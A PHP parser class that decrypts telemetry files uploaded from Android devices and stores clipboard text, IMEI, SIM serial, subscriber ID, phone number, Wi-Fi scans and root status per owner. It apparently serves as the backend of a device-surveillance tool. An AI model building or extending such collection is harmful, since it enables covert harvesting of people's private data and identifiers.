<?php

namespace App\Libraries\Parsers;

use App\Models\CryptModel;
use CodeIgniter\Database\BaseConnection;

class DeviceContextParser
{
    protected BaseConnection $db;

    public function __construct(BaseConnection $db)
    {
        $this->db = $db;
    }

    /**
     * Normalize a parser payload into a decoded associative array.
     */
    protected function payloadToArray(string|array $payload, string $file_name): ?array
    {
        if (is_array($payload)) {
            return $payload;
        }

        $cryptModel = new CryptModel();
        $raw = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
        if ($raw === false) {
            log_message('error', '[payloadToArray] Cannot read file: ' . $file_name);
            return null;
        }

        $decoded = $cryptModel->decrypt_file($raw);
        if ($decoded === false) {
            log_message('error', '[payloadToArray] Decryption failed: ' . $file_name);
            return null;
        }

        $json = json_decode($decoded, true);
        if ($json === null) {
            log_message('error', '[payloadToArray] JSON decode failed: ' . $file_name);
            return null;
        }

        return $json;
    }

    /**
     * DeviceContextExtractor
     * File prefix: device_context_TIMESTAMP.enc
     */
    public function parse_device_context(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $battery      = $json['battery']  ?? [];
            $locale       = $json['locale']   ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id'                   => $owner_id,
                'device_id'                  => $device_id,
                // Battery
                'battery_level_percent'      => $json['battery_level']       ?? $battery['level_percent']        ?? null,
                'battery_is_charging'        => isset($json['battery_is_charging']) ? ($json['battery_is_charging'] ? 1 : 0) : (isset($battery['is_charging']) ? ($battery['is_charging'] ? 1 : 0) : null),
                'battery_plugged_usb'        => isset($json['battery_plugged_usb']) ? ($json['battery_plugged_usb'] ? 1 : 0) : (isset($battery['plugged_usb']) ? ($battery['plugged_usb'] ? 1 : 0) : null),
                'battery_plugged_ac'         => isset($json['battery_plugged_ac'])  ? ($json['battery_plugged_ac'] ? 1 : 0)  : (isset($battery['plugged_ac'])  ? ($battery['plugged_ac'] ? 1 : 0)  : null),
                'battery_temperature_celsius'=> $json['battery_temp']          ?? $battery['temperature_celsius']  ?? null,
                'battery_voltage_mv'         => $json['battery_voltage']       ?? $battery['voltage_mv']           ?? null,
                'battery_health'             => $json['battery_health']        ?? $battery['health']               ?? null,
                // Clipboard
                'clipboard_text'             => $json['clipboard_content']     ?? $json['clipboard_text']          ?? $json['clip_text'] ?? null,
                // Locale
                'locale_country'             => $json['device_country']        ?? $locale['country']               ?? null,
                'locale_display_country'     => $locale['display_country']       ?? null,
                'locale_language'            => $json['device_language']       ?? $locale['language']              ?? null,
                'locale_display_language'    => $locale['display_language']      ?? null,
                'locale_timezone'            => $json['device_timezone']       ?? $locale['timezone']              ?? null,
                'locale_timezone_offset_ms'  => $json['device_timezone_offset'] ?? $locale['timezone_offset_ms']   ?? null,
                // Metadata
                'extracted_at'               => $extracted_at,
                'created_at'                 => $dated,
                'updated_at'                 => $dated,
            ];

            $this->db->table('tbl_device_hardware_contexts')->insert($data);
            log_message('info', '[parse_device_context] Inserted 1 row from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_context] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * NetworkInfoExtractor
     * File prefix: network_info_TIMESTAMP.enc
     */
    public function parse_network_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $wifi         = $json['current_wifi'] ?? [];
            $cellular     = $json['cellular'] ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $mainData = [
                'owner_id'               => $owner_id,
                'device_id'              => $device_id,
                'is_connected'           => isset($json['is_connected'])  ? ($json['is_connected'] ? 1 : 0) : null,
                'connection_type'        => $json['connection_type']       ?? null,
                'is_roaming'             => isset($json['is_roaming'])    ? ($json['is_roaming'] ? 1 : 0) : null,
                'network_operator_name'  => $json['network_operator_name'] ?? null,
                'network_country_iso'    => $json['network_country_iso']   ?? null,
                'sim_operator_name'      => $json['sim_operator_name']     ?? null,
                'sim_country_iso'        => $json['sim_country_iso']       ?? null,
                'sim_state'              => $json['sim_state']             ?? null,
                'phone_type'             => $json['phone_type']            ?? null,
                'device_imei'            => $json['device_imei']           ?? null,
                'sim_serial'             => $json['sim_serial']            ?? null,
                'subscriber_id'          => $json['subscriber_id']         ?? null,
                // Current WiFi (flattened)
                'wifi_ssid'              => $wifi['ssid']        ?? null,
                'wifi_bssid'             => $wifi['bssid']       ?? null,
                'wifi_link_speed'        => $wifi['link_speed']  ?? null,
                'wifi_frequency'         => $wifi['frequency']   ?? null,
                'wifi_rssi'              => $wifi['rssi']        ?? null,
                'wifi_link_speed_mbps'   => $wifi['wifi_link_speed_mbps'] ?? $wifi['link_speed'] ?? null,
                'wifi_frequency_mhz'     => $wifi['wifi_frequency_mhz'] ?? $wifi['frequency'] ?? null,
                'wifi_channel'           => $wifi['wifi_channel'] ?? null,
                'wifi_channel_width'     => $wifi['wifi_channel_width'] ?? null,
                'wifi_noise'             => $wifi['wifi_noise'] ?? null,
                'wifi_snr'               => $wifi['wifi_snr'] ?? null,
                'wifi_standard'          => $wifi['wifi_standard'] ?? null,
                'wifi_phy_mode'          => $wifi['wifi_phy_mode'] ?? null,
                'wifi_tx_rate'           => $wifi['wifi_tx_rate'] ?? null,
                'wifi_rx_rate'           => $wifi['wifi_rx_rate'] ?? null,
                'wifi_retry_rate'        => $wifi['wifi_retry_rate'] ?? null,
                'wifi_lost_packet_rate'  => $wifi['wifi_lost_packet_rate'] ?? null,
                'cell_identity'          => json_encode($json['cell_identity'] ?? []),
                'data_network_type'      => $json['data_network_type'] ?? null,
                'is_5g_nsa'              => isset($cellular['is_5g_nsa']) ? ($cellular['is_5g_nsa'] ? 1 : 0) : 0,
                'is_5g_sa'               => isset($cellular['is_5g_sa']) ? ($cellular['is_5g_sa'] ? 1 : 0) : 0,
                'nr_ssb_frequency'       => $cellular['nr_ssb_frequency'] ?? null,
                'nr_scs'                 => $cellular['nr_scs'] ?? null,
                'nr_band'                => $cellular['nr_band'] ?? null,
                'wifi_mac_address'       => $wifi['mac_address'] ?? null,
                'wifi_ip_address'        => $wifi['ip_address']  ?? null,
                'extracted_at'           => $extracted_at,
                'created_at'             => $dated,
                'updated_at'             => $dated,
            ];

            $this->db->table('tbl_system_network_info')->insert($mainData);
            $networkInfoId = $this->db->insertID();

            // Nearby WiFi child rows
            $nearbyList = $json['network_list'] ?? $json['nearby_wifi'] ?? [];
            if (!empty($nearbyList) && is_array($nearbyList) && $networkInfoId > 0) {
                $nearbyBatch = [];
                foreach ($nearbyList as $ap) {
                    $nearbyBatch[] = [
                        'network_info_id' => $networkInfoId,
                        'owner_id'        => $owner_id,
                        'ssid'            => $ap['ssid']         ?? null,
                        'bssid'           => $ap['bssid']        ?? null,
                        'capabilities'    => $ap['capabilities'] ?? null,
                        'level'           => $ap['level']        ?? null,
                        'frequency'       => $ap['frequency']    ?? null,
                        'created_at'      => $dated,
                    ];
                }
                if (!empty($nearbyBatch)) {
                    $this->db->table('tbl_telemetry_wifi_networks_nearby')->insertBatch($nearbyBatch);
                }
            }

            log_message('info', '[parse_network_info] Inserted network snapshot + ' . count($nearbyList) . ' nearby APs from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_network_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DeviceInfoExtractor → tbl_device_profiles
     * File category: deviceinfo / device_info
     * Stores a full hardware/software snapshot of the device.
     */
    public function parse_device_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extraction_timestamp'] ?? null;

            // Avoid duplicate snapshots for same device+timestamp
            $exists = $this->db->table('tbl_device_profiles')
                ->where('device_id', $device_id)
                ->where('extraction_timestamp', $extracted_at)
                ->countAllResults() > 0;

            if ($exists) {
                log_message('info', '[parse_device_info] Duplicate snapshot skipped for device: ' . $device_id);
                return true;
            }

            $data = [
                'device_model'                => $json['device_model']                ?? null,
                'device_brand'                => $json['device_brand']                ?? null,
                'device_manufacturer'         => $json['device_manufacturer']         ?? null,
                'device_product'              => $json['device_product']              ?? null,
                'device_device'               => $json['device_device']               ?? null,
                'device_board'                => $json['device_board']                ?? null,
                'device_hardware'             => $json['device_hardware']             ?? null,
                'android_version'             => $json['android_version']             ?? null,
                'android_sdk_int'             => $json['android_sdk_int']             ?? null,
                'android_codename'            => $json['android_codename']            ?? null,
                'android_incremental'         => $json['android_incremental']         ?? null,
                'android_base_os'             => $json['android_base_os']             ?? null,
                'android_security_patch'      => $json['android_security_patch']      ?? null,
                'build_id'                    => $json['build_id']                    ?? null,
                'build_type'                  => $json['build_type']                  ?? null,
                'build_tags'                  => $json['build_tags']                  ?? null,
                'build_fingerprint'           => $json['build_fingerprint']           ?? null,
                'build_time'                  => $json['build_time']                  ?? null,
                'build_user'                  => $json['build_user']                  ?? null,
                'build_host'                  => $json['build_host']                  ?? null,
                'build_display'               => $json['build_display']               ?? null,
                'android_id'                  => $json['android_id']                  ?? null,
                'display_width'               => $json['display_width']               ?? null,
                'display_height'              => $json['display_height']              ?? null,
                'display_density'             => $json['display_density']             ?? null,
                'display_density_dpi'         => $json['display_density_dpi']         ?? null,
                'display_scaled_density'      => $json['display_scaled_density']      ?? null,
                'display_xdpi'                => $json['display_xdpi']                ?? null,
                'display_ydpi'                => $json['display_ydpi']                ?? null,
                'cpu_cores'                   => $json['cpu_cores']                   ?? null,
                'cpu_abi'                     => $json['cpu_abi']                     ?? null,
                'cpu_abis'                    => is_array($json['cpu_abis'] ?? null) ? implode(',', $json['cpu_abis']) : ($json['cpu_abis'] ?? null),
                'memory_total_mb'             => $json['memory_total_mb']             ?? null,
                'memory_free_mb'              => $json['memory_free_mb']              ?? null,
                'internal_storage_total_gb'   => $json['internal_storage_total_gb']   ?? null,
                'internal_storage_free_gb'    => $json['internal_storage_free_gb']    ?? null,
                'internal_storage_usable_gb'  => $json['internal_storage_usable_gb']  ?? null,
                'external_storage_total_gb'   => $json['external_storage_total_gb']   ?? null,
                'external_storage_free_gb'    => $json['external_storage_free_gb']    ?? null,
                'phone_number'                => $json['phone_number']                ?? null,
                'sim_operator'                => $json['sim_operator']                ?? null,
                'network_operator'            => $json['network_operator']            ?? null,
                'sim_country'                 => $json['sim_country']                 ?? null,
                'network_country'             => $json['network_country']             ?? null,
                'imei'                        => $json['imei']                        ?? null,
                'meid'                        => $json['meid']                        ?? null,
                'device_id'                   => $device_id,
                'sim_state'                   => $json['sim_state']                   ?? null,
                'language'                    => $json['language']                    ?? null,
                'country'                     => $json['country']                     ?? null,
                'timezone'                    => $json['timezone']                    ?? null,
                'timezone_offset'             => $json['timezone_offset']             ?? null,
                'current_time'                => $json['current_time']                ?? null,
                'current_time_formatted'      => $json['current_time_formatted']      ?? null,
                'battery_charging'            => isset($json['battery_charging'])     ? ($json['battery_charging'] ? 1 : 0) : null,
                'battery_level'               => $json['battery_level']              ?? null,
                'sensor_count'                => $json['sensor_count']               ?? null,
                'mac_address'                 => $json['mac_address']                ?? null,
                'kernel_info'                 => $json['kernel_info']                ?? null,
                'is_emulator'                 => isset($json['is_emulator'])          ? ($json['is_emulator'] ? 1 : 0) : null,
                'is_rooted'                   => isset($json['is_rooted'])            ? ($json['is_rooted'] ? 1 : 0) : null,
                'app_package'                 => $json['app_package']                ?? null,
                'app_version'                 => $json['app_version']                ?? null,
                'app_version_code'            => $json['app_version_code']           ?? null,
                'app_first_install'           => $json['app_first_install']          ?? null,
                'app_last_update'             => $json['app_last_update']            ?? null,
                'extraction_timestamp'        => $extracted_at,
                'extractor_version'           => $json['extractor_version']          ?? '1.0',
                'device_ip_address'           => $json['device_ip_address']          ?? null,
            ];

            $this->db->table('tbl_device_profiles')->insert($data);
            log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_info] Exception: ' . $e->getMessage());
            return false;
        }
    }
}
